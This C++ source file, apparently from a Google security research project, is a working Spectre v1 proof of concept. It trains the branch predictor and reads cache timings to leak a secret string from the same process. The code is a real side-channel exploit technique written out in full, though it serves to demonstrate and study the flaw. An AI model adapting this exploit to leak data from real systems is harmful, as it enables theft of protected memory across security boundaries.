/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "instr.h"

#include <algorithm>
#include <array>
#include <cstring>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks
//
const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Returns the indices of the biggest and second-biggest values in the range.
template <typename RangeT>
static std::pair<size_t, size_t> top_two_indices(const RangeT &range) {
  std::pair<size_t, size_t> result = {0, 0};  // first biggest, second biggest
  for (size_t i = 0; i < range.size(); ++i) {
    if (range[i] > range[result.first]) {
      result.second = result.first;
      result.first = i;
    } else if (range[i] > range[result.second]) {
      result.second = i;
    }
  }
  return result;
}

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char leak_byte(const char *data, size_t offset) {
  // Create an array spanning at least 256 different cache lines, with
  // different cache line available for each possible byte.
  // We can use this for a timing attack: if the CPU has loaded a given cache
  // line, and the cache line it loaded was determined by secret data, we can
  // figure out the secret byte by identifying which cache line was loaded.
  // That can be done via a timing analysis.
  //
  // To do this, we create an array of 256 values, each of which do not share
  // the same cache line as any other. To eliminate false positives due
  // to prefetching, we also ensure no two values share the same page,
  // by spacing them at intervals of 4096 bytes.
  //
  // See 2.3.5.4 Data Prefetching in the Intel Optimization Reference Manual:
  //   "Data prefetching is triggered by load operations when [...]
  //    The prefetched data is within the same 4K byte page as the load
  //    instruction that triggered it."
  //
  // ARM also has this constraint on prefetching:
  //   http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0388i/CBBIAAAA.html
  //
  // Spacing of 4096 was used in the original Spectre paper as well:
  //   https://spectreattack.com/spectre.pdf
  //
  struct BigByte {
    // Explicitly initialize the array. It doesn't matter what we write; it's
    // only important that we write *something* to each page. Otherwise,
    // there's an opportunity for the range to be allocated as zero-fill-on-
    // demand (ZFOD), where all virtual pages are a read-only mapping to the
    // *same* physical page of zeros. The cache in modern Intel CPUs is
    // physically-tagged, so all of those virtual addresses would map to the
    // same cache line and we wouldn't be able to observe a timing difference
    // between accessed and unaccessed pages (modulo e.g. TLB lookups).
    std::array<unsigned char, 4096> padding_ = {};
  };
  std::vector<BigByte> oracle_array(258);
  // The first and last value might be adjacent to other elements on the heap,
  // so we only use the other elements, which are guaranteed to be on different
  // cache lines, and even different pages, than any other value.
  BigByte* isolated_oracle = &oracle_array[1];

  // The size needs to be unloaded from cache to force speculative execution
  // to guess the result of comparison.
  //
  // TODO: since size_in_heap is no longer the only heap-allocated value, it
  // should be allocated into its own unique page
  auto size_in_heap = new size_t(strlen(data));

  std::array<uint64_t, 256> latencies = {};
  std::array<uint64_t, 256> sorted_latencies = {};
  std::array<int, 256> scores = {};
  size_t best_val = 0, runner_up_val = 0;

  for (int run = 0;; ++run) {
    // Flush out entries from the timing array. Now, if they are loaded during
    // speculative execution, that will warm the cache for that entry, which
    // can be detected later via timing analysis.
    for (size_t i = 0; i < 256; ++i) CLFlush(&isolated_oracle[i]);

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    int safe_offset = run % strlen(data);

    // Loop length must be high enough to beat branch predictors.
    // The current length 2048 was established empirically. With significantly
    // shorter loop lengths some branch predictors are able to observe the
    // pattern and avoid branch mispredictions.
    for (size_t i = 0; i < 2048; ++i) {
      // Remove from cache so that we block on loading it from memory,
      // triggering speculative execution.
      CLFlush(size_in_heap);

      // Train the branch predictor: perform in-bounds accesses 2047 times,
      // and then use the out-of-bounds offset we _actually_ care about on the
      // 2048th time.
      // The local_offset value computation is a branchless equivalent of:
      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
      // We need to avoid branching even for unoptimized compilation (-O0).
      // Optimized compilations (-O1, concretely -fif-conversion) would remove
      // the branching automatically.
      size_t local_offset = offset + (
          safe_offset - offset) * (bool)((i + 1) % 2048);

      if (local_offset < *size_in_heap) {
        // This branch was trained to always be taken during speculative
        // execution, so it's taken even on the tenth iteration, when the
        // condition is false!
        ForceRead(&isolated_oracle[(size_t) (data[local_offset])]);
      }
    }

    // Here's the timing side channel: find which char was loaded by measuring
    // latency. Indexing into isolated_oracle causes the relevant region of
    // memory to be loaded into cache, which makes it faster to load again than
    // it is to load entries that had not been accessed.
    // Only two offsets will have been accessed: safe_offset (which we ignore),
    // and i.
    // Note: if the character at safe_offset is the same as the character we
    // want to know at i, the data from this run will be useless, but later runs
    // will use a different safe_offset.
    for (size_t i = 0; i < 256; ++i) {
      // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
      // them all equally fast. Therefore it is necessary to confuse them by
      // accessing the offsets in a pseudo-random order.
      size_t mixed_i = ((i * 167) + 13) & 0xFF;
      void *timing_entry = &isolated_oracle[mixed_i];
      sorted_latencies[mixed_i] = latencies[mixed_i] = ReadLatency(timing_entry);
    }

    std::sort(sorted_latencies.begin(), sorted_latencies.end());
    uint64_t median_latency = sorted_latencies[128];

    // The difference between a cache-hit and cache-miss times is significantly
    // different across platforms. Therefore we must first compute its estimate
    // using the safe_offset which should be a cache-hit.
    uint64_t hitmiss_diff = median_latency - latencies[data[safe_offset]];
    int hitcount = 0;
    for (size_t i = 0; i < 256; ++i) {
      if (latencies[i] < median_latency - hitmiss_diff / 2 &&
          i != (size_t) (data[safe_offset])) ++hitcount;
    }

    // If there is not exactly one hit, we consider that sample invalid and
    // skip it.
    if (hitcount == 1) {
      for (size_t i = 0; i < 256; ++i) {
        if (latencies[i] < median_latency - hitmiss_diff / 2 &&
            i != (size_t) (data[safe_offset])) ++scores[i];
      }
    }

    std::tie(best_val, runner_up_val) = top_two_indices(scores);

    // TODO(jeanpierreda): This timing algorithm is suspect (it is measuring whether
    // something is usually faster than average, rather than usually faster, or
    // faster on average.)
    if (scores[best_val] > (2 * scores[runner_up_val] + 40))
      break;
    // Otherwise: if we still don't know with high confidence, we can keep
    // accumulating timing data until we think we know the value.
    if (run > 100000) {
      std::cerr << "Does not converge " << best_val << " " << scores[best_val]
                << " " << runner_up_val << " " << scores[runner_up_val]
                << std::endl;
      exit(EXIT_FAILURE);
    }
  }
  delete size_in_heap;
  return (char) best_val;
}

int main(int argc, char** argv) {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
